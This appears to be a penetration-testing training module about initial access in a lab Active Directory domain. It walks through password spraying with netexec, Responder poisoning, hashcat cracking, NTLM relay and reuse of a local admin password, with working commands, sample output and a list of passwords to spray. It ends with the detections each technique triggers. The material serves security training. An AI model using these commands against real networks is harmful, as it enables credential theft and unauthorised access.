# 04 - Initial Access

Turning a user list into the first valid credential.

---

## The Goal

You have a list of eight accounts and no passwords. This module gets the first working login. Everything after it depends on this.

Three ways in are covered here: password spraying, network poisoning, and the credentials found on the open share. All three worked. In a real engagement you would take the quietest one that succeeds.

---

## Password Spraying

The single most reliable way into an internal network.

### Why spraying, not brute force

**Brute force** tries many passwords against one account. It locks the account out and it is loud.

**Spraying** tries one password against every account. No single account gets enough failures to lock, and one weak password among many users is nearly always there.

The lab has no lockout threshold (finding PT-11), which makes this trivial. Even with a lockout, spraying one password every 30 minutes stays under most thresholds.

### Run it

```bash
# One likely password against every user
netexec smb 10.50.10.10 -u users.txt -p 'Autumn2024!' --continue-on-success
```

```text
SMB  10.50.10.10  DC01  [-] ptlab.local\arivera:Autumn2024! STATUS_LOGON_FAILURE
SMB  10.50.10.10  DC01  [-] ptlab.local\pshah:Autumn2024! STATUS_LOGON_FAILURE
SMB  10.50.10.10  DC01  [+] ptlab.local\svc_sql:Autumn2024!
```

`svc_sql` with `Autumn2024!`. **First valid credential in under a minute.** That is finding PT-01.

### Reading the result

`[+]` means success. `STATUS_LOGON_FAILURE` means the password was wrong but the account exists. Watch for `STATUS_ACCOUNT_LOCKED_OUT`, which means you have hit a threshold and should stop.

### The password list to spray

Season and year is the most productive single pattern against a small business, because someone chose it to be memorable and to satisfy a complexity rule.

```text
Autumn2024!
Winter2024!
Spring2024!
Summer2024!
Password1
Welcome1
Company2024!
```

**`Autumn2024!` passes every complexity check Windows enforces.** Uppercase, lowercase, number, symbol, eleven characters. It fell to the third guess. That is the point of finding PT-01, and it is the argument for length and breach-checking over complexity rules.

---

## Network Poisoning

A second way in that needs no password at all.

### How it works

When a Windows machine cannot resolve a name through DNS, it shouts the question to the whole local network using LLMNR and NBT-NS. Anyone can answer. If you answer "yes, that server is me," the machine tries to authenticate to you, and hands you a crackable hash.

This is finding PT-08.

### Run it

```bash
# Answer every name request on the network
sudo responder -I eth0 -wf
```

Then wait. On a real network, someone mistypes a share name, or a scheduled task looks for a server that no longer exists, and their machine authenticates to you.

```text
[SMB] NTLMv2-SSP Hash captured from 10.50.10.101
tbecker::PTLAB:1122334455667788:A1B2C3...
```

### Crack it offline

```bash
hashcat -m 5600 tbecker_hash.txt /usr/share/wordlists/rockyou.txt
```

`-m 5600` is the mode for NetNTLMv2. If the password is in the wordlist, you have a second credential and it never touched the domain controller.

### Or relay it instead of cracking it

If SMB signing is off on a target (finding PT-07), you do not even need to crack the hash. You relay it straight to the target and authenticate as that user.

```bash
# Turn off Responder's own SMB and HTTP servers first
sudo responder -I eth0 -wf   # with SMB and HTTP set to Off in the config
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

Any authentication Responder captures gets forwarded to the targets in `targets.txt`. Where signing is off, it succeeds.

**This is why PT-07 and PT-08 are scored separately but are really one problem.** Poisoning captures the authentication, no signing lets you relay it, and together they are a foothold with no password cracking at all.

---

## The Credentials on the Share

The third way in, and the one found by accident in enumeration.

`passwords.xlsx` on the IT share contained:

```text
Local admin (all workstations):  LocalAdmin / Summ3r!Local2024
```

That is finding PT-09, and it feeds finding PT-03, because the same local admin password works on every workstation.

```bash
# Confirm it works, and confirm it is reused
netexec smb 10.50.10.101 -u LocalAdmin -p 'Summ3r!Local2024' --local-auth
netexec smb 10.50.10.102 -u LocalAdmin -p 'Summ3r!Local2024' --local-auth
```

```text
SMB  10.50.10.101  WS-01  [+] WS-01\LocalAdmin (Pwn3d!)
SMB  10.50.10.102  WS-02  [+] WS-02\LocalAdmin (Pwn3d!)
```

`(Pwn3d!)` from netexec means local administrator access. **The same password on both** is finding PT-03, and it is what makes lateral movement across all workstations trivial.

---

## Where We Are Now

Three footholds from three different weaknesses.

| Credential | How | Access | Finding |
| --- | --- | --- | --- |
| `svc_sql` / `Autumn2024!` | Password spray | Domain user, has an SPN | PT-01 |
| `tbecker` / cracked | LLMNR poisoning | Domain user | PT-08 |
| `LocalAdmin` / from share | Open file share | Local admin on all workstations | PT-03, PT-09 |

**Now the enumeration loop turns.** With `svc_sql` as a domain credential, you can run BloodHound properly, request service tickets, and enumerate everything that was invisible anonymously. That is module 06.

First, module 05 shows what happens once you land on a machine and want more rights on it locally.

---

## A Note on Being Caught

Every technique here is detectable.

- The spray produced 40-plus failed logons from one source. That is [SOC-01 rule 100103](../Junior-SOC-Analyst/03-Detection-Rules.md), and it fires in 38 seconds.
- Responder poisoning is visible to anyone watching for a host answering LLMNR for names that are not it.
- The `--local-auth` logins are Windows event 4624 with logon type 3 from an unexpected source.

In a standard internal test you accept this, because coverage is the goal. **Knowing exactly what each of these looks like from the defender's side is what module 09 is about, and it is the thing that makes you valuable on both teams.**

---

## Checklist

- [ ] Password spray run, at least one credential recovered
- [ ] Failure codes read correctly, no accounts locked
- [ ] Responder run, a hash captured
- [ ] Hash cracked offline, or relayed
- [ ] Credentials from the share confirmed and reuse tested
- [ ] Every credential and its access level recorded
- [ ] Noted which detections each technique would trigger

---

Next: [05-Privilege-Escalation.md](05-Privilege-Escalation.md)
